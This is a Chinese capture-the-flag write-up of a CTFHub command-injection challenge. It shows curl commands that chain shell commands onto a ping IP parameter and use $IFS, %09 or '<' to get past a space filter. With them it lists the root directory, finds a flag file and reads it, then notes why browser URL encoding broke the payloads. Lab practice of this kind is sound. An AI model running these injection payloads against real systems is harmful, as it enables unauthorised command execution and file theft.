## 新路径

点击Win+R,搜索cmd

在黑框中输入curl.exe -sS --get --data-urlencode "ip=127.0.0.1;ls$IFS/" "http://challenge-13bfc4db41773bd9.sandbox.ctfhub.com:10800/"

用find命令精准搜索flag文件输入：

curl.exe -sS --get --data-urlencode "ip=127.0.0.1;find$IFS/$IFS-name$IFS*flag*" "http://challenge-13bfc4db41773bd9.sandbox.ctfhub.com:10800/"

屏幕回显：flag_21993936132337.php

输入curl.exe -sS --get --data-urlencode "ip=127.0.0.1;cat$IFS/var/www/html/flag_21993936132337.php" "http://challenge-13bfc4db41773bd9.sandbox.ctfhub.com:10800/"

直接读取flag，回车后屏幕回显出正确的flag

# 笔记

## 失败原因
1. 浏览器会自动“乱改”你的命令（自动转义）

你在浏览器地址栏输入 $IFS 或 ; 时，浏览器觉得这些字符在网址里是“非法”的，它会自动把它们转换成 %24IFS 或 %3B。本来是想让服务器读 $IFS 变量，结果服务器收到了一堆编码，命令直接失效。
 
2. 浏览器会“吞掉”特殊符号（比如 <）
   
你之前尝试过用 cat</flag.php（用 < 代替空格）。但浏览器会把 < 当成 HTML 标签的开头，直接忽略掉后面的内容，或者把路径截断。你看你的截图，地址栏最后确实缺了一部分，这就是浏览器把命令吞了。
 
3. 浏览器的缓存和自动补全
   
浏览器总会记住你上一次访问的网址，当你修改了 Payload 回车时，它有时候会“自作聪明”地用缓存里的旧请求，根本没把你改的新命令发出去。

## 这道题主要学习了：

1、命令注入中“空格过滤”的绕过思维

理解了靶场源码通过 preg_match_all("/ /", $ip, $m) 把空格拉黑了。

绕过不是死磕空格，而是寻找等效替代品：用 ${IFS} 环境变量、%09（Tab键的 URL 编码）、或是 <（重定向符）来替代被过滤的空格。
 
2、浏览器与 CMD 命令行发包的本质差异（核心踩坑点）

深刻体会到了浏览器的“自作聪明”会导致 Payload 失效：它会自动把 $、; 

等字符进行 URL 转义；还会把 < 当成 HTML 标签而吞掉后续内容；甚至因缓存导致请求不更新。

而 CMD 里的 curl.exe 配合 --data-urlencode 可以精准控制编码，一字不差地发送命令，这是渗透测试中构造复杂 Payload 时的必修课。
 
3、curl.exe 的精准发包技巧

再次巩固了 curl.exe -sS --get --data-urlencode "ip=127.0.0.1; 命令" "http://靶场/" 的用法。

--data-urlencode 会自动帮我们把 Payload 编码好，避免了手动编码时容易出现的拼写错误。
 
4、Linux 基础环境变量与命令注入的组合拳

深入理解了 $IFS（内部字段分隔符）在 Linux 中的实际意义——默认包含空格、制表符和换行符。

利用它可以优雅地避开对空格的 WAF 拦截。同时巩固了分号 ; 

在命令拼接中的作用（先执行 ping，再执行注入的命令）。
